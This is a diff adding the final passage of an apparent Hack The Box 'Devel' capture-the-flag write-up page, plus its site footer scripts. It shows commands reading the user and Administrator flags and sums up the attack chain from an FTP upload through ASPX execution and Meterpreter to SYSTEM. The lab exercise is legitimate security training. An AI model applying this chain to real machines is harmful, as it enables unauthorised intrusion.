+<img src="/images/htb-devel/shot-057.png" alt="Screenshot 2026-10-20 at 9.26.16 AM.png" loading="lazy">
+
+<p>There's our user flag. Let's grab it:</p>
+
+<pre><code>type C:\Users\babis\Desktop\user.txt</code></pre>
+
+<img src="/images/htb-devel/shot-059.png" alt="Screenshot 2026-10-20 at 9.27.01 AM copy.png" loading="lazy">
+
+<p>I don't love making assumptions, but let's entertain the idea that the administrator's flag can be found using the same pattern:</p>
+
+<pre><code>dir C:\Users\Administrator\Desktop</code></pre>
+
+<img src="/images/htb-devel/shot-060.png" alt="Screenshot 2026-10-20 at 9.30.04 AM.png" loading="lazy">
+
+<p>I was hoping it might be a bit more hidden, but I'll take it:</p>
+
+<pre><code>type C:\Users\Administrator\Desktop\root.txt</code></pre>
+
+<img src="/images/htb-devel/shot-062.png" alt="Screenshot 2026-10-20 at 9.31.31 AM copy.png" loading="lazy">
+
+<p>And there we have it. Admin = pwned.</p>
+
+<img src="/images/htb-devel/shot-063.png" alt="Screenshot 2026-10-20 at 9.32.13 AM.png" loading="lazy">
+
+<h2>Final attack chain</h2>
+
+<p>FTP write &gt; ASPX execution &gt; Meterpreter session &gt; Windows 7 x86 PrivEsc &gt; SYSTEM.</p>
+</div>
+<footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+(()=>{const t=document.getElementById("menu-toggle"),m=document.getElementById("menu");if(!t||!m)return;document.documentElement.classList.add("js-menu-ready");const close=(focus=false)=>{t.setAttribute("aria-expanded","false");m.classList.remove("menu-open");if(focus)t.focus()};t.addEventListener("click",()=>{const open=t.getAttribute("aria-expanded")==="true";t.setAttribute("aria-expanded",String(!open));m.classList.toggle("menu-open",!open)});m.addEventListener("click",e=>{if(e.target.closest("a"))close()});document.addEventListener("click",e=>{if(t.getAttribute("aria-expanded")==="true"&&!m.contains(e.target)&&!t.contains(e.target))close()});document.addEventListener("keydown",e=>{if(e.key==="Escape"&&t.getAttribute("aria-expanded")==="true")close(true)});window.matchMedia("(min-width: 769px)").addEventListener("change",e=>{if(e.matches)close()})})();
+</script>
+<!-- Cloudflare Web Analytics --><script type='module' src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "d29793993e20413c866dbc989486b294"}'></script><!-- End Cloudflare Web Analytics -->
+</body>
+</html>
